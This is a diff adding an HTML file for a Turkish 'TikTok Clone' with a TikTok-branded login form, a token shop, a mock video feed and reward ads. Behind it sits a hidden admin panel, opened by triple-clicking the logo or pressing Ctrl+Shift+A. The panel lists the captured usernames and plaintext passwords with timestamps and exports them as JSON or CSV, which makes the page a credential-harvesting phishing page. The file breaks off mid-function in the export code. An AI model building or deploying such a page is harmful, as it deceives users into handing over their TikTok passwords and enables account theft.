@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Clone - Video Social Platform</title>
+    <meta name="description" content="TikTok benzeri video sosyal medya platformu - Jeton sistemi ile eğlence">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎵</text></svg>">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        :root {
+            --primary: #000000;
+            --secondary: #121212;
+            --accent: #FF0050;
+            --accent2: #00F2EA;
+            --text: #FFFFFF;
+            --text-secondary: #A0A0A0;
+        }
+
+        body {
+            background: var(--primary);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: var(--secondary);
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid #333;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            cursor: pointer;
+        }
+
+        .jeton-display {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            color: #000;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .language-selector {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+
+        .login-section {
+            padding: 40px 30px;
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .login-subtitle {
+            text-align: center;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: #333;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: transform 0.2s;
+        }
+
+        .login-button:hover {
+            transform: scale(1.02);
+        }
+
+        .jeton-market {
+            display: none;
+            padding: 20px;
+        }
+
+        .market-title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #FFD700;
+        }
+
+        .jeton-packages {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .package {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            border: 2px solid #333;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .package:hover {
+            border-color: #FFD700;
+            transform: scale(1.05);
+        }
+
+        .package-premium {
+            border-color: #FFD700;
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
+        }
+
+        .jeton-count {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFD700;
+            margin: 10px 0;
+        }
+
+        .package-price {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .video-feed {
+            display: none;
+            position: relative;
+            height: calc(100vh - 120px);
+        }
+
+        .video-container {
+            position: relative;
+            height: 100%;
+            background: #000;
+        }
+
+        .video-player {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: var(--primary);
+        }
+
+        .video-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--accent), var(--accent2));
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .video-description {
+            font-size: 14px;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .video-stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+        }
+
+        .stat {
+            text-align: center;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .stat:hover {
+            transform: scale(1.1);
+        }
+
+        .stat-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .nav-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 400px;
+            margin: 0 auto;
+            background: #000;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            border-top: 1px solid #333;
+            z-index: 100;
+        }
+
+        .nav-item {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .nav-item.active {
+            color: white;
+        }
+
+        .nav-item:hover {
+            color: var(--accent);
+        }
+
+        .nav-icon {
+            font-size: 20px;
+            margin-bottom: 2px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.95);
+            padding: 15px 25px;
+            border-radius: 25px;
+            border: 1px solid var(--accent);
+            display: none;
+            z-index: 1000;
+            font-size: 14px;
+            text-align: center;
+            max-width: 90%;
+        }
+
+        /* ADMIN PANEL STYLES */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 2000;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .admin-container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #1a1a1a;
+            border-radius: 15px;
+            padding: 30px;
+            border: 2px solid #333;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #333;
+            padding-bottom: 20px;
+        }
+
+        .admin-title {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .admin-close {
+            background: #FF0050;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+
+        .admin-close:hover {
+            background: #cc0040;
+        }
+
+        .admin-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #FFD700;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .admin-controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .admin-btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+
+        .admin-btn.export {
+            background: #28a745;
+            color: white;
+        }
+
+        .admin-btn.export:hover {
+            background: #218838;
+        }
+
+        .admin-btn.clear {
+            background: #dc3545;
+            color: white;
+        }
+
+        .admin-btn.clear:hover {
+            background: #c82333;
+        }
+
+        .admin-btn.refresh {
+            background: #007bff;
+            color: white;
+        }
+
+        .admin-btn.refresh:hover {
+            background: #0056b3;
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 12px;
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: #FFD700;
+        }
+
+        .records-table {
+            width: 100%;
+            background: #2a2a2a;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #333;
+        }
+
+        .table-header {
+            background: #333;
+            padding: 15px;
+            display: grid;
+            grid-template-columns: 60px 1fr 1fr 150px;
+            gap: 15px;
+            font-weight: bold;
+            color: #FFD700;
+        }
+
+        .table-row {
+            padding: 15px;
+            display: grid;
+            grid-template-columns: 60px 1fr 1fr 150px;
+            gap: 15px;
+            border-bottom: 1px solid #333;
+            align-items: center;
+            transition: background 0.3s;
+        }
+
+        .table-row:hover {
+            background: #333;
+        }
+
+        .table-row:last-child {
+            border-bottom: none;
+        }
+
+        .no-records {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+            font-size: 16px;
+        }
+
+        /* Video Swipe Container */
+        .video-swipe-container {
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-slide {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .video-slide.active {
+            opacity: 1;
+        }
+
+        /* Ad Container */
+        .ad-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1500;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ad-video {
+            width: 90%;
+            max-width: 300px;
+            height: 200px;
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
+            border-radius: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 18px;
+            border: 2px solid #FFD700;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ad-timer {
+            font-size: 24px;
+            color: #FFD700;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .ad-skip {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .ad-progress {
+            width: 80%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .ad-progress-bar {
+            height: 100%;
+            background: #FFD700;
+            width: 0%;
+            transition: width 0.1s;
+        }
+
+        @media (max-width: 600px) {
+            .table-header, .table-row {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+            
+            .table-header div:first-child,
+            .table-row div:first-child {
+                display: none;
+            }
+            
+            .admin-controls {
+                flex-direction: column;
+            }
+            
+            .admin-btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo" id="logo" onclick="logoClick()">抖音</div>
+            <div class="jeton-display" id="jetonDisplay">💎 0 Jeton</div>
+            <select class="language-selector" id="languageSelector" onchange="changeLanguage()">
+                <option value="tr">🇹🇷 Türkçe</option>
+                <option value="en">🇺🇸 English</option>
+                <option value="zh">🇨🇳 中文</option>
+                <option value="ar">🇸🇦 العربية</option>
+            </select>
+        </div>
+
+        <div class="login-section" id="loginSection">
+            <div class="login-title" id="loginTitle">TikTok'a Giriş Yap</div>
+            <div class="login-subtitle" id="loginSubtitle">Hayatı kaydet, yaratıcı ol</div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label class="input-label" id="phoneLabel">Telefon / E-posta / Kullanıcı adı</label>
+                    <input type="text" class="input-field" id="usernameInput" placeholder="Kullanıcı adınızı girin" required>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" id="passwordLabel">Şifre</label>
+                    <input type="password" class="input-field" id="passwordInput" placeholder="Şifrenizi girin" required>
+                </div>
+
+                <button type="submit" class="login-button" id="loginButton">Giriş Yap</button>
+            </form>
+        </div>
+
+        <div class="jeton-market" id="jetonMarket">
+            <div class="market-title">💎 Jeton Market</div>
+            
+            <div class="jeton-packages">
+                <div class="package" onclick="buyPackage(100)">
+                    <div>💎 Standart</div>
+                    <div class="jeton-count">100 Jeton</div>
+                    <div class="package-price">₺9.99</div>
+                </div>
+                <div class="package package-premium" onclick="buyPackage(500)">
+                    <div>💎💎 Premium</div>
+                    <div class="jeton-count">500 Jeton</div>
+                    <div class="package-price">₺39.99</div>
+                </div>
+                <div class="package" onclick="buyPackage(1000)">
+                    <div>💎💎💎 Elite</div>
+                    <div class="jeton-count">1000 Jeton</div>
+                    <div class="package-price">₺69.99</div>
+                </div>
+                <div class="package package-premium" onclick="buyPackage(5000)">
+                    <div>💎💎💎💎 VIP</div>
+                    <div class="jeton-count">5000 Jeton</div>
+                    <div class="package-price">₺299.99</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="video-feed" id="videoFeed">
+            <div class="video-container">
+                <div class="video-swipe-container" id="videoSwipeContainer">
+                    <!-- Videos will be dynamically added here -->
+                </div>
+                <div class="video-overlay">
+                    <div class="user-info">
+                        <div class="user-avatar" id="currentUserAvatar">U</div>
+                        <div>
+                            <div style="font-weight: bold;" id="currentUsername">@kullanici</div>
+                            <div style="font-size: 12px; color: var(--text-secondary);" id="videoMusic">Orijinal ses</div>
+                        </div>
+                    </div>
+                    <div class="video-description" id="currentVideoDescription">Video açıklaması...</div>
+                    <div class="video-stats">
+                        <div class="stat" onclick="likeVideo()">
+                            <div class="stat-icon" id="likeIcon">❤️</div>
+                            <div id="likeCount">0</div>
+                        </div>
+                        <div class="stat" onclick="commentVideo()">
+                            <div class="stat-icon">💬</div>
+                            <div id="commentCount">0</div>
+                        </div>
+                        <div class="stat" onclick="shareVideo()">
+                            <div class="stat-icon">🔗</div>
+                            <div>Paylaş</div>
+                        </div>
+                        <div class="stat" onclick="showMarket()">
+                            <div class="stat-icon">💎</div>
+                            <div>Jeton</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="nav-bar">
+            <div class="nav-item active" onclick="showSection('videoFeed')">
+                <div class="nav-icon">🏠</div>
+                <div>Ana Sayfa</div>
+            </div>
+            <div class="nav-item" onclick="showSection('jetonMarket')">
+                <div class="nav-icon">💎</div>
+                <div>Jetonlar</div>
+            </div>
+            <div class="nav-item" onclick="showAd()">
+                <div class="nav-icon">🎁</div>
+                <div>Jeton Kazan</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">💬</div>
+                <div>Gelen Kutusu</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">👤</div>
+                <div>Profil</div>
+            </div>
+        </div>
+
+        <div class="notification" id="notification"></div>
+    </div>
+
+    <!-- AD CONTAINER -->
+    <div class="ad-container" id="adContainer">
+        <div class="ad-video">
+            <button class="ad-skip" onclick="skipAd()" id="skipBtn" style="display: none;">Atla</button>
+            <div id="adContent">📱 REKLAM VİDEOSU</div>
+        </div>
+        <div class="ad-timer" id="adTimer">5</div>
+        <div class="ad-progress">
+            <div class="ad-progress-bar" id="adProgressBar"></div>
+        </div>
+        <div style="color: var(--text-secondary); text-align: center;" id="adText">
+            Reklam bitince <strong>+5 jeton</strong> kazanacaksın!<br>
+            <small>Reklamı izle, jetonları topla!</small>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-container">
+            <div class="admin-header">
+                <div class="admin-title">🔐 Admin Paneli</div>
+                <button class="admin-close" onclick="closeAdmin()">✕ Kapat</button>
+            </div>
+
+            <div class="admin-stats">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalRecords">0</div>
+                    <div class="stat-label">Toplam Kayıt</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="todayRecords">0</div>
+                    <div class="stat-label">Bugünkü Girişler</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="lastLogin">-</div>
+                    <div class="stat-label">Son Giriş</div>
+                </div>
+            </div>
+
+            <div class="admin-controls">
+                <button class="admin-btn export" onclick="exportJSON()">📥 JSON İndir</button>
+                <button class="admin-btn export" onclick="exportCSV()">📊 Excel İndir</button>
+                <button class="admin-btn refresh" onclick="loadRecords()">🔄 Yenile</button>
+                <button class="admin-btn clear" onclick="clearAllRecords()">🗑️ Tümünü Sil</button>
+            </div>
+
+            <input type="text" class="search-box" id="searchBox" placeholder="🔍 Kullanıcı adı veya tarih ile ara..." onkeyup="filterRecords()">
+
+            <div class="records-table">
+                <div class="table-header">
+                    <div>#</div>
+                    <div>Kullanıcı Adı</div>
+                    <div>Şifre</div>
+                    <div>Tarih/Saat</div>
+                </div>
+                <div id="recordsContainer"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data Structures
+        let jeton = 100;
+        let currentSection = 'loginSection';
+        let loginRecords = [];
+        let logoClickCount = 0;
+        let logoClickTimer;
+        let currentVideoIndex = 0;
+        let likedVideos = new Set();
+        let videoComments = {};
+        let adInterval;
+
+        // Video Database - 10 TikTok videos
+        const videos = [
+            {
+                id: 1,
+                username: "@dans_ustasi",
+                userInitial: "D",
+                description: "Yeni koreografi! 💃 Bu hareketleri beğeneceksiniz! #dans #koreografi #trend",
+                music: "Özgün ses - dans_ustasi",
+                likes: 12543,
+                comments: 234,
+                color: "#FF0050"
+            },
+            {
+                id: 2,
+                username: "@komedi_kanali",
+                userInitial: "K",
+                description: "Günlük hayattan komik anlar 😂 #komedi #gülmek #eğlence",
+                music: "Popüler ses - komedi_kanali",
+                likes: 8921,
+                comments: 567,
+                color: "#00F2EA"
+            },
+            {
+                id: 3,
+                username: "@yemek_tarifleri",
+                userInitial: "Y",
+                description: "5 dakikada nefis tatlı 🍰 Tarif için profilime bakın! #yemek #tatlı #tarif",
+                music: "Trend ses - yemek_tarifleri",
+                likes: 15678,
+                comments: 891,
+                color: "#FFD700"
+            },
+            {
+                id: 4,
+                username: "@spor_hocasi",
+                userInitial: "S",
+                description: "Evde yapabileceğiniz egzersizler 💪 #spor #fitness #sağlık",
+                music: "Motivasyon Müziği",
+                likes: 23456,
+                comments: 1234,
+                color: "#4CAF50"
+            },
+            {
+                id: 5,
+                username: "@seyahat_blogu",
+                userInitial: "S",
+                description: "Kapadokya'da balon turu 🎈 #seyahat #gezi #kapadokya",
+                music: "Doğa Sesleri",
+                likes: 34567,
+                comments: 1567,
+                color: "#9C27B0"
+            },
+            {
+                id: 6,
+                username: "@müzik_cover",
+                userInitial: "M",
+                description: "Popüler şarkıya cover 🎵 #müzik #cover #şarkı",
+                music: "Cover - müzik_cover",
+                likes: 17890,
+                comments: 678,
+                color: "#2196F3"
+            },
+            {
+                id: 7,
+                username: "@hayvan_sever",
+                userInitial: "H",
+                description: "Kedimin komik anları 😺 #kedi #hayvan #komik",
+                music: "Oyun Sesleri",
+                likes: 45678,
+                comments: 2345,
+                color: "#FF9800"
+            },
+            {
+                id: 8,
+                username: "@moda_tavsiye",
+                userInitial: "M",
+                description: "Yaz modası trendleri 👗 #moda #stil #trend",
+                music: "Moda Müziği",
+                likes: 12345,
+                comments: 456,
+                color: "#E91E63"
+            },
+            {
+                id: 9,
+                username: "@teknoloji_dünyası",
+                userInitial: "T",
+                description: "Yeni çıkan telefon incelemesi 📱 #teknoloji #inceleme #telefon",
+                music: "Teknoloji Teması",
+                likes: 9876,
+                comments: 345,
+                color: "#607D8B"
+            },
+            {
+                id: 10,
+                username: "@sanat_eseri",
+                userInitial: "S",
+                description: "Resim yapma sürecim 🎨 #sanat #resim #yaratıcılık",
+                music: "Klasik Müzik",
+                likes: 23456,
+                comments: 789,
+                color: "#795548"
+            }
+        ];
+
+        // Ad Database - 2 reklam videosu
+        const ads = [
+            {
+                id: 1,
+                title: "🎮 Yeni Oyun Lansmanı",
+                description: "Epik macera seni bekliyor! Şimdi indir!",
+                duration: 5,
+                reward: 5
+            },
+            {
+                id: 2,
+                title: "🛒 İndirim Fırsatı",
+                description: "%50'ye varan indirimler! Kaçırma!",
+                duration: 5,
+                reward: 5
+            }
+        ];
+
+        // Initialize video comments
+        videos.forEach(video => {
+            videoComments[video.id] = video.comments;
+        });
+
+        // Load saved data
+        function loadSavedData() {
+            const savedJeton = localStorage.getItem('tiktok_jeton');
+            const savedRecords = localStorage.getItem('tiktok_login_records');
+            const savedLikes = localStorage.getItem('tiktok_likes');
+            const savedComments = localStorage.getItem('tiktok_comments');
+            
+            if (savedJeton) {
+                jeton = parseInt(savedJeton);
+                updateJetonDisplay();
+            }
+            
+            if (savedRecords) {
+                loginRecords = JSON.parse(savedRecords);
+            }
+
+            if (savedLikes) {
+                likedVideos = new Set(JSON.parse(savedLikes));
+            }
+
+            if (savedComments) {
+                videoComments = JSON.parse(savedComments);
+            }
+        }
+
+        // Save data
+        function saveData() {
+            localStorage.setItem('tiktok_jeton', jeton);
+            localStorage.setItem('tiktok_login_records', JSON.stringify(loginRecords));
+            localStorage.setItem('tiktok_likes', JSON.stringify([...likedVideos]));
+            localStorage.setItem('tiktok_comments', JSON.stringify(videoComments));
+        }
+
+        // Initialize Videos
+        function initializeVideos() {
+            const container = document.getElementById('videoSwipeContainer');
+            container.innerHTML = '';
+            
+            videos.forEach((video, index) => {
+                const slide = document.createElement('div');
+                slide.className = `video-slide ${index === 0 ? 'active' : ''}`;
+                slide.style.background = `linear-gradient(45deg, ${video.color}, #000)`;
+                slide.innerHTML = `
+                    <div style="width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; font-size: 24px; color: white; font-weight: bold;">
+                        ${video.username}<br>
+                        <div style="font-size: 16px; margin-top: 10px;">${video.description.split(' ').slice(0, 3).join(' ')}...</div>
+                    </div>
+                `;
+                container.appendChild(slide);
+            });
+            
+            showVideo(0);
+        }
+
+        // Show specific video
+        function showVideo(index) {
+            const slides = document.querySelectorAll('.video-slide');
+            slides.forEach(slide => slide.classList.remove('active'));
+            
+            if (slides[index]) {
+                slides[index].classList.add('active');
+                currentVideoIndex = index;
+                
+                const video = videos[index];
+                document.getElementById('currentUserAvatar').textContent = video.userInitial;
+                document.getElementById('currentUserAvatar').style.background = `linear-gradient(45deg, ${video.color}, #000)`;
+                document.getElementById('currentUsername').textContent = video.username;
+                document.getElementById('videoMusic').textContent = video.music;
+                document.getElementById('currentVideoDescription').textContent = video.description;
+                document.getElementById('likeCount').textContent = formatNumber(video.likes + (likedVideos.has(video.id) ? 1 : 0));
+                document.getElementById('commentCount').textContent = formatNumber(videoComments[video.id]);
+                
+                // Update like icon
+                document.getElementById('likeIcon').textContent = likedVideos.has(video.id) ? '❤️' : '🤍';
+            }
+        }
+
+        // Format large numbers
+        function formatNumber(num) {
+            if (num >= 1000000) {
+                return (num / 1000000).toFixed(1) + 'M';
+            } else if (num >= 1000) {
+                return (num / 1000).toFixed(1) + 'K';
+            }
+            return num;
+        }
+
+        // Video interactions
+        function likeVideo() {
+            const currentVideo = videos[currentVideoIndex];
+            if (likedVideos.has(currentVideo.id)) {
+                likedVideos.delete(currentVideo.id);
+                document.getElementById('likeIcon').textContent = '🤍';
+            } else {
+                likedVideos.add(currentVideo.id);
+                document.getElementById('likeIcon').textContent = '❤️';
+                jeton += 1; // Like başına 1 jeton
+                updateJetonDisplay();
+                showNotification('❤️ Beğendin! +1 jeton kazandın!');
+            }
+            document.getElementById('likeCount').textContent = formatNumber(currentVideo.likes + (likedVideos.has(currentVideo.id) ? 1 : 0));
+            saveData();
+        }
+
+        function commentVideo() {
+            const comment = prompt('Yorumunuzu yazın:');
+            if (comment && comment.trim() !== '') {
+                videoComments[videos[currentVideoIndex].id]++;
+                document.getElementById('commentCount').textContent = formatNumber(videoComments[videos[currentVideoIndex].id]);
+                jeton += 2; // Yorum başına 2 jeton
+                updateJetonDisplay();
+                showNotification('💬 Yorum yaptın! +2 jeton kazandın!');
+                saveData();
+            }
+        }
+
+        function shareVideo() {
+            jeton += 3; // Paylaşım başına 3 jeton
+            updateJetonDisplay();
+            showNotification('🔗 Paylaştın! +3 jeton kazandın!');
+        }
+
+        // Ad system
+        function showAd() {
+            const randomAd = ads[Math.floor(Math.random() * ads.length)];
+            const adContainer = document.getElementById('adContainer');
+            const adContent = document.getElementById('adContent');
+            const adTimer = document.getElementById('adTimer');
+            const adProgressBar = document.getElementById('adProgressBar');
+            const skipBtn = document.getElementById('skipBtn');
+            const adText = document.getElementById('adText');
+            
+            adContent.innerHTML = `
+                <div style="text-align: center;">
+                    <div style="font-size: 20px; margin-bottom: 10px;">${randomAd.title}</div>
+                    <div style="font-size: 14px; color: var(--text-secondary);">${randomAd.description}</div>
+                </div>
+            `;
+            
+            adText.innerHTML = `
+                Reklam bitince <strong>+${randomAd.reward} jeton</strong> kazanacaksın!<br>
+                <small>Reklamı izle, jetonları topla!</small>
+            `;
+            
+            adContainer.style.display = 'flex';
+            let timeLeft = randomAd.duration;
+            adTimer.textContent = timeLeft;
+            adProgressBar.style.width = '0%';
+            skipBtn.style.display = 'none';
+            
+            clearInterval(adInterval);
+            adInterval = setInterval(() => {
+                timeLeft--;
+                adTimer.textContent = timeLeft;
+                adProgressBar.style.width = `${((randomAd.duration - timeLeft) / randomAd.duration) * 100}%`;
+                
+                if (timeLeft <= 3) {
+                    skipBtn.style.display = 'block';
+                }
+                
+                if (timeLeft <= 0) {
+                    clearInterval(adInterval);
+                    finishAd(randomAd.reward);
+                }
+            }, 1000);
+        }
+
+        function skipAd() {
+            clearInterval(adInterval);
+            finishAd(2); // Skip edince daha az jeton
+        }
+
+        function finishAd(reward) {
+            document.getElementById('adContainer').style.display = 'none';
+            jeton += reward;
+            updateJetonDisplay();
+            showNotification(`🎉 Reklamı izledin! +${reward} jeton kazandın!`);
+        }
+
+        // Swipe functionality for videos
+        let startY = 0;
+        let currentY = 0;
+
+        document.getElementById('videoSwipeContainer').addEventListener('touchstart', (e) => {
+            startY = e.touches[0].clientY;
+        });
+
+        document.getElementById('videoSwipeContainer').addEventListener('touchmove', (e) => {
+            currentY = e.touches[0].clientY;
+        });
+
+        document.getElementById('videoSwipeContainer').addEventListener('touchend', () => {
+            const diff = startY - currentY;
+            
+            if (Math.abs(diff) > 50) { // Minimum swipe distance
+                if (diff > 0 && currentVideoIndex < videos.length - 1) {
+                    // Swipe up - next video
+                    showVideo(currentVideoIndex + 1);
+                } else if (diff < 0 && currentVideoIndex > 0) {
+                    // Swipe down - previous video
+                    showVideo(currentVideoIndex - 1);
+                }
+            }
+        });
+
+        // Keyboard navigation for videos
+        document.addEventListener('keydown', (e) => {
+            if (currentSection === 'videoFeed') {
+                if (e.key === 'ArrowUp' && currentVideoIndex < videos.length - 1) {
+                    showVideo(currentVideoIndex + 1);
+                } else if (e.key === 'ArrowDown' && currentVideoIndex > 0) {
+                    showVideo(currentVideoIndex - 1);
+                }
+            }
+        });
+
+        // Logo click handler for admin panel
+        function logoClick() {
+            logoClickCount++;
+            
+            if (logoClickCount === 1) {
+                logoClickTimer = setTimeout(() => {
+                    logoClickCount = 0;
+                }, 2000);
+            }
+            
+            if (logoClickCount === 3) {
+                clearTimeout(logoClickTimer);
+                logoClickCount = 0;
+                openAdmin();
+            }
+        }
+
+        // Keyboard shortcut
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+                e.preventDefault();
+                openAdmin();
+            }
+        });
+
+        // Open Admin Panel
+        function openAdmin() {
+            document.getElementById('adminPanel').style.display = 'block';
+            loadRecords();
+            showNotification('🔐 Admin paneli açıldı');
+        }
+
+        // Close Admin Panel
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        // Load Records
+        function loadRecords() {
+            const container = document.getElementById('recordsContainer');
+            const totalEl = document.getElementById('totalRecords');
+            const todayEl = document.getElementById('todayRecords');
+            const lastEl = document.getElementById('lastLogin');
+            
+            if (loginRecords.length === 0) {
+                container.innerHTML = '<div class="no-records">📭 Henüz kayıt yok</div>';
+                totalEl.textContent = '0';
+                todayEl.textContent = '0';
+                lastEl.textContent = '-';
+                return;
+            }
+            
+            // Calculate stats
+            const today = new Date().toLocaleDateString('tr-TR');
+            const todayCount = loginRecords.filter(r => r.date.includes(today)).length;
+            const lastLogin = loginRecords[loginRecords.length - 1];
+            
+            totalEl.textContent = loginRecords.length;
+            todayEl.textContent = todayCount;
+            lastEl.textContent = lastLogin.time;
+            
+            // Display records
+            container.innerHTML = loginRecords.map((record, index) => `
+                <div class="table-row">
+                    <div>${loginRecords.length - index}</div>
+                    <div style="word-break: break-all;">${record.username}</div>
+                    <div style="word-break: break-all;">${record.password}</div>
+                    <div style="font-size: 12px; color: var(--text-secondary);">${record.date}<br>${record.time}</div>
+                </div>
+            `).reverse().join('');
+        }
+
+        // Filter Records
+        function filterRecords() {
+            const search = document.getElementById('searchBox').value.toLowerCase();
+            const rows = document.querySelectorAll('.table-row');
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(search) ? 'grid' : 'none';
+            });
+        }
+
+        // Export JSON
+        function exportJSON() {
+            const data = JSON.stringify(loginRecords, null, 2);
